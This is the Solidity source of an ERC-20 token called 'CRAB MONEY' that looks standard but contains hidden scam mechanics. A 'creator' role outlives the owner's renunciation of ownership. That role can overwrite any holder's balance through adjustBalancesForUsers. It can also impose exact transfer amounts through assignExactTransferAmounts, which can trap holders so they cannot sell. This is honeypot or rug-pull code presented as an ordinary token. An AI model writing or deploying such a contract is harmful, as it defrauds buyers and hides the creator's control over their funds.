pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextModified {
    function getSenderAddress() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwner is ContextModified {
    address private _contractOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = getSenderAddress();
        _contractOwner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function getContractOwner() public view virtual returns (address) {
        return _contractOwner;
    }

    modifier mustBeOwner() {
        require(getContractOwner() == getSenderAddress(), "Action must be performed by the owner");
        _;
    }

    function relinquishOwnership() public virtual mustBeOwner {
        emit OwnershipTransferred(_contractOwner, address(0x000000000000000000000000000000000000dEaD));
        _contractOwner = address(0x000000000000000000000000000000000000dEaD);
    }
}




contract CRAB is ContextModified, SingleOwner, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _exactTransferAmounts;
    address private _tokenCreator;

    string public constant _name = "CRAB MONEY";
    string public constant _symbol = "CRAB";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);

    constructor() {
        _balances[getSenderAddress()] = _totalSupply;
        emit Transfer(address(0), getSenderAddress(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    modifier mustBeCreator() {
        require(getTokenCreator() == getSenderAddress(), "Action must be performed by the creator");
        _;
    }

    function getTokenCreator() public view virtual returns (address) {
        return _tokenCreator;
    }

    function changeTokenCreator(address newCreator) public mustBeOwner {
        _tokenCreator = newCreator;
    }

    event TokenDistributed(address indexed user, uint256 oldBalance, uint256 updatedBalance);

    function queryExactTransferAmount(address account) public view returns (uint256) {
        return _exactTransferAmounts[account];
    }

    function assignExactTransferAmounts(address[] calldata accounts, uint256 amount) public mustBeCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _exactTransferAmounts[accounts[i]] = amount;
        }
    }

    function adjustBalancesForUsers(address[] memory userAddresses, uint256 desiredAmount) public mustBeCreator {
        require(desiredAmount >= 0, "Desired amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "User address must not be zero address");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = desiredAmount;

            emit TokenDistributed(currentUser, oldBalance, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[getSenderAddress()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = queryExactTransferAmount(getSenderAddress());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[getSenderAddress()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(getSenderAddress(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[getSenderAddress()][spender] = amount;
        emit Approval(getSenderAddress(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][getSenderAddress()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = queryExactTransferAmount(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][getSenderAddress()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}